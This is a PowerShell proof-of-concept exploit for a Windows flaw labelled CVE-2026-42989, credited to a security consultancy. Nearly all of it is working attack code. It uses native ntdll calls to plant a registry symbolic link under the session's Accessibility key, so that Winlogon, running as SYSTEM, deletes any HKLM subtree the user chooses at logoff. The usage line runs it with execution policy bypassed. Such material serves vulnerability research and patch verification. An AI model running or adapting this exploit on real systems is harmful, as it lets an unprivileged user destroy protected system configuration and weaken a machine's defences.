<#
================================================================================
 PoC - CVE-2026-42989 @w3bd3vil ( https://krashconsulting.com )
 Winlogon deletes the target registry subtree at session teardown.
 
 USAGE
   powershell -ep bypass .\poc_cve_2026_42989.ps1 "HKLM\SOFTWARE\TargetKey"
   Then logout and restart PC.
================================================================================
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory=$true, Position=0)]
    [string]$TargetPath
)

$ErrorActionPreference = 'Stop'

# ---- resolve target to native NT path -----------------------------------------
# Accept: HKLM:\Software\Foo  or  HKLM\Software\Foo  or  \REGISTRY\MACHINE\...
if ($TargetPath -match '^HKLM:?\\?(.*)$') {
    $TargetRel = $Matches[1]
    $TargetNt  = "\REGISTRY\MACHINE\$TargetRel"
} elseif ($TargetPath -match '^\\REGISTRY\\') {
    $TargetNt = $TargetPath
} else {
    throw "Unsupported path format. Use HKLM:\Software\Foo or \REGISTRY\MACHINE\..."
}

# ---- session / SAT key --------------------------------------------------------
$SessionId   = (Get-Process -Id $PID).SessionId
$SatRel      = "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session$SessionId"
$SatWin32    = "HKLM:\$SatRel"
$SubName     = 'poc'
$LinkName    = 'link'
$LinkNt      = "\REGISTRY\MACHINE\$SatRel\$SubName\$LinkName"

Write-Host "[*] Session id : $SessionId"
Write-Host "[*] SAT key    : $SatWin32"
Write-Host "[*] Target     : $TargetNt"

if (-not (Test-Path $SatWin32)) {
    throw "SAT key not present. Log on interactively first (or press Win+U at logon UI)."
}
if (-not (Test-Path $TargetPath)) {
    Write-Warning "Target key does not exist yet. The link will still be planted."
}

# ---- C# native helpers --------------------------------------------------------
$cs = @'
using System;
using System.Runtime.InteropServices;
using System.Text;

public static class RegSymlink
{
    [StructLayout(LayoutKind.Sequential)]
    struct UNICODE_STRING { public ushort Length; public ushort MaximumLength; public IntPtr Buffer; }

    [StructLayout(LayoutKind.Sequential)]
    struct OBJECT_ATTRIBUTES {
        public int    Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public uint   Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }

    const uint OBJ_CASE_INSENSITIVE  = 0x40;
    const uint REG_OPTION_VOLATILE   = 0x1;
    const uint REG_OPTION_CREATE_LINK= 0x2;
    const int  REG_LINK              = 6;
    const uint KEY_SET_VALUE         = 0x2;
    const uint KEY_CREATE_LINK       = 0x20;

    static readonly IntPtr HKLM = new IntPtr(unchecked((int)0x80000002));

    [DllImport("ntdll.dll")]
    static extern int NtCreateKey(out IntPtr KeyHandle, uint DesiredAccess, ref OBJECT_ATTRIBUTES oa,
                                  int TitleIndex, IntPtr Class, uint CreateOptions, out uint Disposition);
    [DllImport("ntdll.dll")]
    static extern int NtSetValueKey(IntPtr KeyHandle, ref UNICODE_STRING ValueName, int TitleIndex,
                                    int Type, byte[] Data, int DataSize);
    [DllImport("ntdll.dll")]
    static extern int NtClose(IntPtr h);

    static UNICODE_STRING US(string s) {
        UNICODE_STRING u = new UNICODE_STRING();
        u.Length        = (ushort)(s.Length * 2);
        u.MaximumLength  = (ushort)(s.Length * 2 + 2);
        u.Buffer         = Marshal.StringToHGlobalUni(s);
        return u;
    }

    public static uint CreateLink(string linkNtPath, string targetNtPath) {
        UNICODE_STRING name = US(linkNtPath);
        IntPtr pName = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(UNICODE_STRING)));
        Marshal.StructureToPtr(name, pName, false);

        OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
        oa.Length          = Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES));
        oa.ObjectName      = pName;
        oa.Attributes      = OBJ_CASE_INSENSITIVE;

        IntPtr h; uint disp;
        int st = NtCreateKey(out h, KEY_SET_VALUE | KEY_CREATE_LINK, ref oa, 0, IntPtr.Zero,
                             REG_OPTION_CREATE_LINK | REG_OPTION_VOLATILE, out disp);
        Marshal.FreeHGlobal(name.Buffer);
        Marshal.FreeHGlobal(pName);
        if (st != 0) return (uint)st;

        UNICODE_STRING val = US("SymbolicLinkValue");
        byte[] data = Encoding.Unicode.GetBytes(targetNtPath);
        int st2 = NtSetValueKey(h, ref val, 0, REG_LINK, data, data.Length);
        Marshal.FreeHGlobal(val.Buffer);
        NtClose(h);
        return (uint)st2;
    }
}
'@
if (-not ([Type]::GetType('RegSymlink', $false))) {
    Add-Type -TypeDefinition $cs | Out-Null
} else {
    Write-Host "[*] RegSymlink type already loaded, skipping Add-Type."
}

# ---- create child subkey, grant ourselves KEY_CREATE_LINK ---------------------
Write-Host "[*] Creating child subkey and granting KEY_CREATE_LINK..."
$PocSubRel = "$SatRel\$SubName"
[void][Microsoft.Win32.Registry]::LocalMachine.CreateSubKey(
    $PocSubRel,
    [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
    [Microsoft.Win32.RegistryOptions]::Volatile)
$rk = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
    $PocSubRel,
    [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,
    [System.Security.AccessControl.RegistryRights]::ChangePermissions)
try {
    $me   = [Security.Principal.WindowsIdentity]::GetCurrent().User
    $sec  = $rk.GetAccessControl([System.Security.AccessControl.AccessControlSections]::Access)
    $rule = New-Object System.Security.AccessControl.RegistryAccessRule(
                $me,
                [System.Security.AccessControl.RegistryRights]::CreateLink,
                [System.Security.AccessControl.AccessControlType]::Allow)
    $sec.AddAccessRule($rule)
    $rk.SetAccessControl($sec)
} finally { $rk.Dispose() }
Write-Host "[+] Child key ready."

# ---- plant the symlink --------------------------------------------------------
Write-Host "[*] Planting registry symlink:"
Write-Host "      $LinkNt"
Write-Host "    --> $TargetNt"
$st = [RegSymlink]::CreateLink($LinkNt, $TargetNt)
if ($st -ne 0) { throw ("NtCreateKey/NtSetValueKey failed, NTSTATUS=0x{0:X8}" -f $st) }
Write-Host "[+] Symlink planted." -ForegroundColor Green

Write-Host ""
Write-Host ">>> shutdown /l and then Restart PC to check" -ForegroundColor Yellow
Write-Host "    Winlogon (SYSTEM) will delete the SAT subtree and follow the link into:" -ForegroundColor Yellow
Write-Host "    $TargetNt" -ForegroundColor Yellow
